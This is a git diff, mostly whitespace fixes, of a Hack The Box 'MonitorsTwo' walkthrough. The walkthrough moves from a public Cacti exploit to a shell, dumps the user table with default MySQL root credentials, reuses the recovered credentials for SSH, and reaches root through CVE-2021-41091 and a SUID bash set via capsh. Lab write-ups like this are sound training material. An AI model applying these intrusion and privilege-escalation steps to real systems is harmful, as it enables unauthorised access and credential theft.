@@ -34,6 +34,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Have 2 ports(`22`, `80`) are open.
 
 ## Web enumeration
+
 With `Dirsearch`, i found some link but nothing interested.
 
 Search vulnarability for `Cacti` on [exploit-db](https://www.exploit-db.com/exploits/51166)  
@@ -45,10 +46,11 @@ After edit `local_cacti_ip = 127.0.0.1` script run well. And got shell.
 ## Foothold
 
 Upload `linpeas.sh` and find a vector to exploit.  
-First of all, we are in docker container.   
+First of all, we are in docker container.
 ![](/commons/HTB/MonitorsTwo/2_docker_env.png)
 
-Found some interesting points.   
+Found some interesting points.
+
 ```shell
 ╔══════════╣ Possible Entrypoints
 -rw-r--r-- 1 root     root      648 Jan  5 11:37 /entrypoint.sh
@@ -98,7 +100,8 @@ fi
 exec "$@"
 
 ```
-We can run mysql with defaul creds `mysql --host=db --user=root --password=root cacti -e "show tables"`   
+
+We can run mysql with defaul creds `mysql --host=db --user=root --password=root cacti -e "show tables"`
 
 ```shell
 mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
@@ -123,20 +126,22 @@ Use this creds for `SSH` connection.
 ## Privilege Escalation
 
 Continous use `linpeas.sh` to find a vector priv.  
-After focus on output of linpeas.   
+After focus on output of linpeas.
 we can see mail of `/var/mail/marcus` that include some interesting detail.
 
 Have 3 CVEs on system
+
 - CVE-2021-33033 ---> ???
 - CVE-2020-25706 ---> can not exploit.
-- CVE-2021-41091 ---> can exploit with public poc https://github.com/UncleJ4ck/CVE-2021-41091
+- CVE-2021-41091 ---> can exploit with public poc <https://github.com/UncleJ4ck/CVE-2021-41091>
 
-Put `exp.sh` file to victim machine.   
-Run script but can not find `./bin/bash` have a suid.   
+Put `exp.sh` file to victim machine.
+Run script but can not find `./bin/bash` have a suid.
 
-Go back docker enviroment.   
-Check GUID and find [capsh](https://gtfobins.github.io/gtfobins/capsh)   
-We add SUID to `bin/bash`   
+Go back docker enviroment.
+Check GUID and find [capsh](https://gtfobins.github.io/gtfobins/capsh)
+We add SUID to `bin/bash`
+
 ```shell
 find / -type f -perm /4000 2>/dev/null
 /usr/bin/gpasswd
@@ -155,5 +160,5 @@ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
 ```
 
-Now go back to marcus shell.   
+Now go back to marcus shell.
 GOT ROOT :)))
